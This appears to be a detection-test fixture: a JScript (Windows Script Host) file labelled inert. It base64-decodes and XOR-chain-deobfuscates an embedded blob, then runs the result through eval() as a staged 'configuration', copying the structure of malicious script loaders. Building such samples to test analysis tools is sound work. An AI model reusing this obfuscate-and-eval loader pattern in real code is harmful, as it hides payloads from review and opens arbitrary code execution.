// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_6f0a2581 = function decode_6f0a2581_body(storedMaterial) {
  var recoveredMaterial = [];
  var previous = 21;
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ previous); previous = storedMaterial[i]; }
  return recoveredMaterial;
};
var recover_fa1e25ee = function recover_fa1e25ee_body() {
  var packedText = "bkw/Sy5eLQ81bkwoTS5BJUAffBN9G3IVYBJzB24Bb01hQzFUIFUnSRZ1GnQSexxpG3oOZwhmRBk1F3YScwN3EmBCeFoJahhxAXUcchU7fxZ1AWgHaQh6AyENL1k4VCFENxUvVHYVdBlpCGEGaDdeOhgiAGMCbx9+F3AeMwE1BTwPaV4/XmZEaEoiTT5KFXwYOgAiSiVWIg89CTkAM1ViA2JaeAUpC3gMbQpvLEM2WCwONAZ7";

  var storedMaterial = decodeBase64(packedText);



  var recoveredMaterial = [];

  var pass = 0;

  while (pass < 1) { recoveredMaterial = decode_6f0a2581.apply(null, [storedMaterial]); pass++; }

  var configurationText;

  configurationText = "";

  for (var bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }

  return configurationText;
};
var inspect_7ab43b9f = function inspect_7ab43b9f_body() {
  var configuration = eval("(" + recover_fa1e25ee.apply(null, []) + ")");
  var analysisPlan = new Object();
  analysisPlan.steps = configuration.steps;
  analysisPlan.adapter = configuration.adapter;
  analysisPlan.values = configuration.values;
  analysisPlan.stageCount = configuration.stageCount;
  return analysisPlan;
};
